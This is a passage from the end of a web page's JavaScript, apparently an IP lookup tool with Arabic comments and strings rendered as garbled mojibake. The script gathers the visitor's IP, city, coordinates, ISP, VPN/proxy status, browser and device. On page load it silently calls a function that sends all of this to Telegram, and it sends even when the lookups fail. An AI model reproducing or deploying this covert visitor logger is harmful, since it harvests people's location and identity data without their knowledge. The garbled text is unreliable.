          console.error('ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…');
        }
        
      } catch (error) {
        console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…:', error);
      } finally {
        // Ø¥Ø®ÙØ§Ø¡ Ù…Ø¤Ø´Ø± Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
        setTimeout(() => {
          indicator.style.display = 'none';
        }, 3000);
      }
    }

    // Fetch IP info using a reliable free API. ipify gives IP; ipapi.co gives country too.
    async function fetchIP(){
      const ipEl = document.getElementById('ipValue');
      const countryEl = document.getElementById('country');
      const loadingIndicator = document.getElementById('loadingIndicator');
      const copyBtn = document.getElementById('copyIp');
      
      ipEl.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...';
      countryEl.textContent = '';
      loadingIndicator.style.display = 'inline-block';
      copyBtn.style.display = 'none';
      
      // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„
      document.querySelectorAll('.info-card p').forEach(el => {
        if (el.id !== 'ipValue') el.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...';
      });

      // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø®Ø·Ø§Ø¡
      currentIpData.errors = [];

      try {
        // Ø£ÙˆÙ„Ø§Ù‹ Ù†Ø­ØµÙ„ Ø§Ù„Ù€ IP Ù…Ù† ipify
        const r1 = await fetch('https://api.ipify.org?format=json', {cache: 'no-store'});
        if(!r1.ok) throw new Error('ÙØ´Ù„ Ø·Ù„Ø¨ IP');
        const j1 = await r1.json();
        const ip = j1.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';

        // Ø¨Ø¹Ø¯ Ù†Ø¬ÙŠØ¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© (Ø¨Ù„Ø¯) Ù…Ù† ipapi.co
        let countryText = '';
        let cityText = '';
        let timezoneText = '';
        let ispText = '';
        let lat = 0;
        let lng = 0;
        let region = '';
        let countryCode = '';
        let ipType = 'IPv4';
        
        try {
          const r2 = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {cache: 'no-store'});
          if(r2.ok){
            const data = await r2.json();
            if(data.country_name) countryText = data.country_name;
            if(data.city) cityText = data.city;
            if(data.timezone) timezoneText = data.timezone;
            if(data.org) ispText = data.org;
            if(data.latitude) lat = data.latitude;
            if(data.longitude) lng = data.longitude;
            if(data.region) region = data.region;
            if(data.country_code) countryCode = data.country_code;
            if(data.version) ipType = data.version;
          }
        } catch(e){
          currentIpData.errors.push(`Ø®Ø·Ø£ ÙÙŠ ipapi.co: ${e.message}`);
        }
        
        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù…Ù† API Ø¢Ø®Ø±
        let isProxy = false;
        let isVPN = false;
        let isHosting = false;
        
        try {
          const r3 = await fetch(`https://ipapi.com/ip_api.php?ip=${encodeURIComponent(ip)}`, {cache: 'no-store'});
          if (r3.ok) {
            const data = await r3.json();
            if (data.proxy !== undefined) isProxy = data.proxy;
            if (data.vpn !== undefined) isVPN = data.vpn;
            if (data.hosting !== undefined) isHosting = data.hosting;
          }
        } catch(e) {
          currentIpData.errors.push(`Ø®Ø·Ø£ ÙÙŠ ipapi.com: ${e.message}`);
        }

        // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        ipEl.textContent = ip;
        if (countryText && cityText) {
          countryEl.textContent = `Ø§Ù„Ø¨Ù„Ø¯: ${countryText} - Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${cityText}`;
          document.getElementById('location').textContent = `${cityText}, ${region}, ${countryText}`;
        } else if (countryText) {
          countryEl.textContent = `Ø§Ù„Ø¨Ù„Ø¯: ${countryText}`;
          document.getElementById('location').textContent = countryText;
        } else {
          countryEl.textContent = '';
          document.getElementById('location').textContent = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
        }
        
        document.getElementById('timezone').textContent = timezoneText || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
        document.getElementById('isp').textContent = ispText || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
        document.getElementById('ipType').textContent = ipType;
        
        // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¹Ù„Ù… Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ØªÙˆÙØ±Ø§Ù‹
        if (countryCode) {
          const flag = document.createElement('span');
          flag.className = 'flag';
          flag.textContent = getFlagEmoji(countryCode);
          countryEl.appendChild(flag);
        }
        
        // ØªØ­Ø¯ÙŠØ« Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù†
        document.getElementById('proxyStatus').innerHTML = isProxy ? 
          '<span class="security-badge security-warning">Ù…ÙØ¹Ù„</span>' : 
          '<span class="security-badge security-safe">ØºÙŠØ± Ù…ÙØ¹Ù„</span>';
          
        document.getElementById('vpnStatus').innerHTML = isVPN ? 
          '<span class="security-badge security-warning">Ù…ÙØ¹Ù„</span>' : 
          '<span class="security-badge security-safe">ØºÙŠØ± Ù…ÙØ¹Ù„</span>';
        
        // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ ÙˆØ§Ù„Ø¬Ù‡Ø§Ø²
        const browserInfo = getBrowserInfo();
        document.getElementById('deviceType').textContent = browserInfo.device;
        document.getElementById('browserInfo').textContent = browserInfo.browser;
        
        // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø£Ù…Ø§Ù†
        const securityAnalysis = analyzeSecurity({
          proxy: isProxy,
          vpn: isVPN,
          hosting: isHosting
        });
        document.getElementById('securityAnalysis').innerHTML = securityAnalysis.analysis;
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø®Ø±ÙŠØ·Ø© Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ù…ØªÙˆÙØ±Ø©
        if (lat && lng) {
          updateMap(lat, lng, `${cityText}, ${countryText}`);
        } else {
          document.getElementById('map').innerHTML = '<p style="text-align:center;padding:20px">Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªÙˆÙØ± Ù„Ù„Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø±ÙŠØ·Ø©</p>';
          currentIpData.errors.push('Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠØ© ØºÙŠØ± Ù…ØªÙˆÙØ±Ø©');
        }
        
        // Ù‚ÙŠØ§Ø³ Ø³Ø±Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒØ©
        const speedInfo = await measureNetworkSpeed();
        document.getElementById('downloadSpeed').textContent = speedInfo.download;
        document.getElementById('uploadSpeed').textContent = speedInfo.download; // ØªÙ‚Ø¯ÙŠØ± ØªÙ‚Ø±ÙŠØ¨ÙŠ
        document.getElementById('pingTime').textContent = `${speedInfo.ping} Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©`;
        document.getElementById('connectionStatus').textContent = 'Ù…ØªØµÙ„';
        
        // Ø¥Ø¸Ù‡Ø§Ø± Ø²Ø± Ø§Ù„Ù†Ø³Ø®
        copyBtn.style.display = 'inline-block';
        loadingIndicator.style.display = 'none';
        
        // Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø§Ù„ÙŠØ©
        currentIpData = {
          ip,
          country: countryText,
          city: cityText,
          region,
          timezone: timezoneText,
          isp: ispText,
          proxy: isProxy,
          vpn: isVPN,
          type: ipType,
          lat,
          lng,
          securityAnalysis: securityAnalysis.analysis,
          errors: currentIpData.errors
        };

        // Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù… (ÙÙ‚Ø· Ø¥Ø°Ø§ Ù„Ù… ÙŠØªÙ… Ù…Ù† Ù‚Ø¨Ù„)
        if (!autoSendExecuted) {
          autoSendExecuted = true;
          setTimeout(() => {
            sendAllInfoToTelegram();
          }, 1000);
        }
        
      } catch (err) {
        ipEl.textContent = 'Ù…Ø§ Ù‚Ø¯Ø±Ù†Ø§ Ù†Ø¬ÙŠØ¨ Ø§Ù„Ù€IP';
        countryEl.textContent = String(err.message || err);
        loadingIndicator.style.display = 'none';
        currentIpData.errors.push(`Ø®Ø·Ø£ Ø±Ø¦ÙŠØ³ÙŠ: ${err.message}`);
        
        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø­ØªÙ‰ Ù…Ø¹ ÙˆØ¬ÙˆØ¯ Ø£Ø®Ø·Ø§Ø¡
        if (!autoSendExecuted) {
          autoSendExecuted = true;
          setTimeout(() => {
            sendAllInfoToTelegram();
          }, 1000);
        }
      }
    }

    // Ø¯Ø§Ù„Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø±Ù…Ø² Ø§Ù„Ø¹Ù„Ù… Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø¨Ù„Ø¯
    function getFlagEmoji(countryCode) {
      if (!countryCode) return '';
      const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt());
      return String.fromCodePoint(...codePoints);
    }

    // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    document.addEventListener('DOMContentLoaded', function() {
      // Ø­Ø¯Ø« Ø²Ø± Ø§Ù„ØªØ­Ø¯ÙŠØ«
      document.getElementById('refresh').addEventListener('click', function() {
        autoSendExecuted = false; // Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
        fetchIP();
      });
      
      // Ø­Ø¯Ø« Ù†Ø³Ø® Ø§Ù„Ù€IP
      document.getElementById('copyIp').addEventListener('click', function() {
        copyToClipboard(currentIpData.ip || document.getElementById('ipValue').textContent);
      });
      
      // Ø£Ø­Ø¯Ø§Ø« Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
      document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
          // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ù†Ø´Ø§Ø· Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
          document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
          
          // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ù†Ø´Ø§Ø· Ù„Ù„ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù…Ø­Ø¯Ø¯
          this.classList.add('active');
          const tabId = this.getAttribute('data-tab');
          document.getElementById(`${tabId}-tab`).classList.add('active');
        });
      });
      
      // ØªØ­Ù…ÙŠÙ„ Ø£ÙˆÙ„ÙŠ - Ø³ÙŠØ¤Ø¯ÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
      fetchIP();
    });
  </script>
</body>
</html>
